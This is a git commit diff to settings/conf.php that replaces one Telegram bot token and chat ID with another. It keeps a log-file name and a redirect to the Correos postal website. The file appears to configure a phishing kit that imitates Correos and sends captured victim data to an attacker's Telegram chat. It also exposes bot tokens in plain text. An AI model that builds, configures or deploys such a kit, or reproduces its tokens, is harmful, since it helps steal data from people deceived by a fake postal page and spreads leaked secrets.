a53e4c0d68fc236cc7e844130e6d437c76e0ecb7
HJDFNDFNBN <120227562+HJDFNDFNBN@users.noreply.github.com>
2022-12-17 12:57:00 +0100

    Update conf.php

--- settings/conf.php
+++ settings/conf.php
@@ -2,9 +2,9 @@
 
 error_reporting(0);
 
-define("TELEGRAM_TOKEN", "5777781269:AAGvzaB6hHMqgQl1b24B855Zc-UNT6BTX-k");
-define("TELEGRAM_CHAT_ID", "680230374");
-define("TELEGRAM_CHAT_IDD", "-680230374");
+define("TELEGRAM_TOKEN", "5714108919:AAFjblAccIQWH4bYe0NxAT1lJFug2eidv74");
+define("TELEGRAM_CHAT_ID", "872051313");
+define("TELEGRAM_CHAT_IDD", "-872051313");
 define("TXT_FILE_NAME", 'mjinina.txt');
 define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
 
